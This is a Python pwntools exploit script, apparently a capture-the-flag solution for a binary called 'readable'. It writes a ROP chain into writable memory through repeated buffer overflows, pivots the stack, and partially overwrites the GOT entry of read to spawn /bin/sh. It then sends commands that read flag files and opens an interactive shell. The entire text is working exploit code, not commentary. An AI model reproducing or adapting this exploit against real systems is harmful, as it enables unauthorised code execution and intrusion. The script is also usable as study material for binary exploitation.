from pwn import *
import time,sys,binascii

elf_name = "./readable"
elf = ELF(elf_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process( elf_name )
gdb.attach(io, "b *0x0000000000400520")

pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40058a
read_got = 0x00000000006008E8

rop_addr = 0x600910
leave_ret = 0x400520

rop = p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
rop += p64(0x0) #rbx
rop += p64(0x1) #rbp
rop += p64(read_got) #r12
rop += p64(0x3b) #r13
rop += p64(read_got - 0x3a) #r14
rop += p64(0x0) #r15
rop += p64(0x400570) #ret
rop += p64(0x41414141)

rop += p64(0x0) #rbx
rop += p64(0x1) #rbp
rop += p64(read_got) #r12
rop += p64(0x600e00) #r13
rop += p64(0x600e00) #r14
rop += p64(read_got - 0x3a) #r15
rop += p64(0x400570) #ret

def write_bytes(dest, data):
    payload = 'a' * 16
    payload += p64(dest + 0x10)
    payload += p64(0x400505)
    payload += data.ljust(16, '\x00')
    payload += p64(0x600f00)
    payload += p64(0x400505)
    io.send(payload)

def set_rsp(dest):
    payload = 'a' * 16
    payload += p64(dest - 0x8)
    payload += p64(0x400520)
    io.send(payload)


for x in xrange(0, len(rop), 16):
    write_bytes(rop_addr + x, rop[x:x+16])
    print 'x is : ', x

set_rsp(rop_addr)

payload = '/bin/sh'.ljust(0x3a, '\x00') + '\xee'
io.send(payload)

payload1 = 'ls /home; ls /home/*; cat /home/readable/flag; cat /flag;\n'
io.send(payload1)

io.interactive()
